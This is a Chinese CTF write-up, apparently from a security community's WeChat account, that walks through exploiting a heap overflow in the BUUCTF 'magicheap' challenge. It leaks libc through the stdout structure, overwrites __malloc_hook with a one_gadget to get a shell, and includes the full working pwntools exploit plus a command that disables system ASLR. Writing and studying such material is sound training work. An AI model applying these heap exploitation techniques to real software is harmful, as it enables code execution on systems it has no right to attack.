#  从漏洞到Shell：堆溢出漏洞利用实战指南   
原创 章鱼哥  白帽子社区团队   2025-02-11 01:37  
  
**关于无问社区**  
  
  
无问社区-官网：http://www.wwlib.cn  
  
本文来自社区成员，章鱼哥投稿欢迎大家投稿。投稿可获得无问社区AI大模型的使用红包哦！  
  
  
我们无问社区通过使用全球大量行业技术语料进行训练，截至目前  
无问AI  
在  
红蓝对抗、应急响应、等保、风险评估、安全咨询等方面无论是知识面的或者是深度都有着极为出色的表现。  
  
还可进行连续问答和图片识别问题并解答。  
  
  
  
### 0x01 开篇stdout  
  
  
  
最近在buuctf  
上找到这么一道题目【  
hitcontraining_magicheap  
】  
  
解答完感觉思路挺有意思，就来分享一下  
  
通过  
无问AI模型先给大家讲解一下什么是stdout  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM4jF87LURMEUyPIVOZfrvF34bMeeaGXiaLOHvqDcOLibdCXGF2QRR9Oic09drPP8Qf1dZ0QTbjHf7YIA/640?wx_fmt=png "")  
  
stdout  
 是程序默认的输出流，其底层是一个 _IO_FILE  
 结构体。在漏洞利用中，攻击者可以通过修改 stdout  
 结构体的字段，控制程序的输出行为，从而泄露内存地址或绕过保护机制。本文中，stdout  
 结构体被用作泄露 libc 地址的关键目标，是漏洞利用中的重要一环。  
  
### 0x02 开始正式做题  
  
  
  
例行检查：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM4jF87LURMEUyPIVOZfrvF3h6tDhPML1R63toVib79pXm2nVicaTcrQsmvhv6hLBF0O0dgiazNh9RM4A/640?wx_fmt=png "")  
  
除了  
pie  
，其他保护机制都开了。放到  
IDA  
中分析  
  
漏洞分析：  
- **菜单功能**  
：  
  
- 程序提供了一个菜单，允许用户进行堆块的创建、编辑和释放操作。  
  
- 程序没有直接的输出功能，这意味着我们需要通过其他方式泄露内存地址。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM4jF87LURMEUyPIVOZfrvF3v99ztxj8HYodTNOoxVQQIiadv0Sx0YEVlFgoDKcyvsiatvHbgCv3MBRQ/640?wx_fmt=png "")  
  
发现程序是没有输出功能的，这里我们想到了去打  
stdout  
结构体来  
leak  
出地址，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM4jF87LURMEUyPIVOZfrvF3TtDXJaAiafTDQrNh10VCt9qj22V9FaXQV45DRszkyib3r5kSiasNyWQxA/640?wx_fmt=png "")  
  
这里是有一个后门的，我设置了满足的条件发现没出  
flag  
，应该比赛的环境下  
flag  
路径是对的，但  
buuctf路径是不对的，所以我们就去  
get shell  
拿  
flag  
。  
  
漏洞点在  
edit()  
函数中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM4jF87LURMEUyPIVOZfrvF37zJRLs3bUeSShqYy7iaRNKIcULkiaiaetXnYBByqM8xaAFfUQ05PBtN7Q/640?wx_fmt=png "")  
  
creat_heap()  
函数获取我们的大小后，在  
edit()  
中又再次让我们输入大小，存在堆溢出  
.  
  
接下来我们就对堆溢出进行利用  
.  
  
### 0x03 漏洞的利用与调试  
  
  
  
为了调试放便，我借用了  
rencvn  
大佬的方法，通过命令：  
```
echo 0 > /proc/sys/kernel/randomize_va_space 关掉地址随机化
```  
  
我们的整体思路：  
  
1.  
打  
stdout  
结构体  
leak  
出  
libc  
地址  
  
2.  
劫持  
malloc_hook,  
覆盖成  
one_gadget  
  
3.  
申请触发  
one_gadget  
  
我们先申请几个堆块看看堆布局的情况：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM4jF87LURMEUyPIVOZfrvF3icWepUsg07xJkeK4MRLLV4vWuOEufrZat2Km5mmjsxqune0o0ovb0Wg/640?wx_fmt=png "")  
  
此时堆中布局：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM4jF87LURMEUyPIVOZfrvF3fmPYELkXcBW6ZMrgLmkpb29EGwiapIJNZOicKJVBEAlsaQa21kHUY5zg/640?wx_fmt=png "")  
  
通过堆溢出，改写  
1  
号堆块的  
size  
位，引起向下合并  
```
free(2)
edit(0,0x70,'A'*0x60+p64(0)+p64(0x181))
```  
  
此时：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM4jF87LURMEUyPIVOZfrvF3EbQicAB1IEOrWHIYV0451ia5kXMKaAQlYAbCHoxxnnAFfSjIs7l3ja2A/640?wx_fmt=png "")  
  
我们在通过  
free(1),  
在申请出来，残留  
main_arena  
指针在  
fastbin  
中，  
```
free（1）
add(0x100,'A')
```  
  
  
此时堆中布局：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM4jF87LURMEUyPIVOZfrvF3icDDjpcnwP6QicPfcygnXqichjldLgBeGrEjjo32micTOsEFCZyswHZqDQ/640?wx_fmt=png "")  
  
在次利用堆溢出，覆盖  
main_arena  
低地址两字节，劫持到  
stdout  
结构体附近  
```
edit(1,0x120,'A'*0x100+p64(0)+p64(0x71)+'\xdd\x25')#这里没直接用stdout的低字节，而是
stdout-0x43的地址，绕过ubantu16下的堆头检查机制
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM4jF87LURMEUyPIVOZfrvF3UyHhyJichYibicNnMn8msT2ukAZFXGnRBpXyVjrv6WEFGiaCG1TSiawQwxw/640?wx_fmt=png "")  
  
  
  
接下来覆盖  
stdout  
即可  
leak  
出地址  
```
add(0x60,'A')
payload = 'A'*0x33
payload += p64(0xfbad1800)
payload += p64(0)*3
payload += '\x00'
add(0x60,payload)
leak = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
success(hex(leak))
libc_base = leak-0x3c5600
```  
  
接下来正常劫持  
malloc_hook  
为  
one_gadget  
即可  
```
malloc_hook = libc_base + libc.sym['__malloc_hook']
success(hex(malloc_hook))
one = [0x45226,0x4527a,0xf03a4,0xf1247]
one1 = [0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget = libc_base + one[3]
add(0x60,'ccccc')
free(3)
edit(2,0x80,'A'*0x60+p64(0)+p64(0x71)+p64(malloc_hook-0x23))
add(0x60,'A')
add(0x60,'A'*0x13+p64(one_gadget))
choice(1)
io.recvuntil(':')
io.sendline('20')
io.interactive()
```  
  
完整  
exp:  
```
from pwn import *
elf = ELF('./magicheap')
io = remote('node4.buuoj.cn',27557)
#io = process('./magicheap')
#libc = elf.libc
libc = ELF('./libc-2.23.so')
context.log_level='debug'
def choice(c):
io.recvuntil(':')
io.sendline(str(c))
def add(size,content):
choice(1)
io.recvuntil(':')
io.sendline(str(size))
io.recvuntil(':')
io.send(content)
def edit(index,size,content):
choice(2)
io.recvuntil(':')
io.sendline(str(index))
io.recvuntil(':')
io.sendline(str(size))
io.recvuntil(':')
io.send(content)
def free(index):
choice(3)
io.recvuntil(':')
io.sendline(str(index))
add(0x60,'AAA')
add(0x100,'AAA')
add(0x60,'AAA')
add(0x60,'AAA')
free(2)
edit(0,0x70,'A'*0x60+p64(0)+p64(0x181))
free(1)
add(0x100,'A')
edit(1,0x120,'A'*0x100+p64(0)+p64(0x71)+'\xdd\x25')
gdb.attach(io)
add(0x60,'A')
payload = 'A'*0x33
payload += p64(0xfbad1800)
payload += p64(0)*3
payload += '\x00'
add(0x60,payload)
leak = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
success(hex(leak))
libc_base = leak-0x3c5600
success(hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
success(hex(malloc_hook))
#one = [0x45226,0x4527a,0xf03a4,0xf1247]
one1 = [0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget = libc_base + one1[3]
add(0x60,'ccccc')
free(3)
edit(2,0x80,'A'*0x60+p64(0)+p64(0x71)+p64(malloc_hook-0x23))
add(0x60,'A')
add(0x60,'A'*0x13+p64(one_gadget))
choice(1)
io.recvuntil(':')
io.sendline('20')
#gdb.attach(io)
io.interactive()
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM4jF87LURMEUyPIVOZfrvF3TcMm8KUR14uObxHofibAKOfTbGiadViavtCFEzLPgJeWzVsqQvJ2qibPEw/640?wx_fmt=png "")  
  
### 0x04 总结  
  
  
### stdout 是程序默认的输出流，其底层是一个 _IO_FILE 结构体。在漏洞利用中，攻击者可以通过修改 stdout 结构体的字段，控制程序的输出行为，从而泄露内存地址或绕过保护机制。本文中，stdout 结构体被用作泄露 libc 地址的关键目标，是漏洞利用中的重要一环。  
  
  
最后，欢迎点赞评论留下自己的看法，会随机抽取五名幸运儿赠送，无问社区社区红包！  
  
欢迎大家前来使用无问AI大模型  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/DK5OZOOglM5EKCH4ruTDCg2fshRYcyv7k1wu85fkTbqyEZjuHTWvW6HPJarDXJQNDNjYc6r0ZCiaXH0r67OhfBQ/640?wx_fmt=gif&from=appmsg "")  
  
  
  
  
[VBS后门的免杀方式的研究](http://mp.weixin.qq.com/s?__biz=MzkzNDQ0MDcxMw==&mid=2247486926&idx=1&sn=5edc3b381b93c8ed132ccf7fce66729c&chksm=c2bc77a8f5cbfebe9a757475a11f9bb6f1b0f69d1a40a0179bfda59232746805d1d5981e4b3d&scene=21#wechat_redirect)  
  
  
[应急响应沟通准备与技术梳理（Windows篇）](https://mp.weixin.qq.com/s?__biz=MzkzNDQ0MDcxMw==&mid=2247487108&idx=1&sn=194e12f9ce38b5b1a051323d19a188f0&scene=21#wechat_redirect)  
  
  
[向日葵RCEbypass](http://mp.weixin.qq.com/s?__biz=MzkzNDQ0MDcxMw==&mid=2247486880&idx=1&sn=e898bb43f0ebcd28df583ed34e08ef82&chksm=c2bc77c6f5cbfed08bac7008334611c98e40c559dce34c00a4a49f0e940814b32763187365ee&scene=21#wechat_redirect)  
  
  
[总结|教育行业渗透打点](http://mp.weixin.qq.com/s?__biz=MzkzNDQ0MDcxMw==&mid=2247485327&idx=1&sn=0e5850ea499b72bc974d7ca8977d8883&chksm=c2bc7de9f5cbf4ffe68651163a8c8c072e5062d770ac9c9184627ad75bf004d98a76f77f376a&scene=21#wechat_redirect)  
  
  
[ThinkCMF框架任意内容包含漏洞的讲解](http://mp.weixin.qq.com/s?__biz=MzkzNDQ0MDcxMw==&mid=2247486851&idx=1&sn=8f94ebc62e24af1308f334c4836abe1b&chksm=c2bc77e5f5cbfef333ba1839b91cbe68425b2fb7e331380a10f800f571441a70bd98dba64f59&scene=21#wechat_redirect)  
  
  
**加入粉丝群可在公众号页面联系我们进群**  
  
  
